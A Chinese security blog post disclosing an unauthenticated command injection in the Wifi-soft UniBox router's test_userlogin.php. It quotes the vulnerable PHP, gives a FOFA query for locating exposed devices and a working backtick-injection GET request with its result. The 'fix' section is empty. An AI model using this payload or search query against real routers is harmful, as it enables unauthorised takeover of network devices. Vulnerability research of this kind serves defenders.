---
title: "Unibox路由器 authentication/test_userlogin.php 命令执行漏洞"
source: https://mrxn.net/jswz/unibox-authentication-test_userlogin-rce.html
asset_dir: assets/unibox路由器-authenticationtest_userlogin.php-命令执行漏洞
---

# Unibox路由器 authentication/test\_userlogin.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/3 08:26
* 7690浏览
* [0评论](#comment)
* 10分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Wifi-soft UniBox controller 路由器产品中存在一个致命漏洞，`/authentication/test_userlogin.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。

网络设备

# 影响版本

# fofa语法

> `body="Unibox" && body="Controller" || body="www.wifi-soft.com"`

# 漏洞分析

直接看 `/authentication/test_userlogin.php` 的业务实现造成漏洞的关键部分如下

```
if ($_REQUEST['testuser'] == 1){
    $username = stripslashes(trim($_REQUEST['username'])); 
    $password = stripslashes(trim($_REQUEST['password'])); 
    $server = "localhost";
    $port = 1812;

    $tmp_file = tempnam("/tmp",'DA');
    $comm = "/usr/bin/radtest \"$username\" \"$password\" $server:$port 0 testing123 > $tmp_file";

    $reply = exec($comm);
```

如果 `testuser=1` 则直接将 `username` 和 `password` 拼接进 `$comm` 中后使用 `exec` 直接执行命令，无任何过滤或校验，造成[命令执行](https://mrxn.net/tag/rce)漏洞，因此我们只需要闭合双引号即可完成命令注入利用或者使用反引号执行命令。

网络安全

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用

> 支持cookie获取参数，注意检测位置以及多个参数均存在命令执行漏洞，别漏
>
> 如果不使用反引号执行命令，则需要先闭合双引号

```
GET /authentication/test_userlogin.php?testuser=1&username=`env>11.txt`%20%23%20 HTTP/1.1
Host: unibox.mrxn.net
```

访问命令执行结果文件 `/authentication/11.txt`

[![Unibox路由器 authentication/test_userlogin.php 命令执行漏洞](images/img-001-f4f9b5145237.webp)](https://image.mrxn.net/7d538ff60d8c429c93cc5ca8f4b99254.webp)

成功获得 `env` 命令执行的结果

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[Unibox路由器 authentication/test\_userlogin.php 命令执行漏洞](https://mrxn.net/jswz/unibox-authentication-test_userlogin-rce.html)  
文章链接：<https://mrxn.net/jswz/unibox-authentication-test_userlogin-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/unibox-authentication-test\_userlogin-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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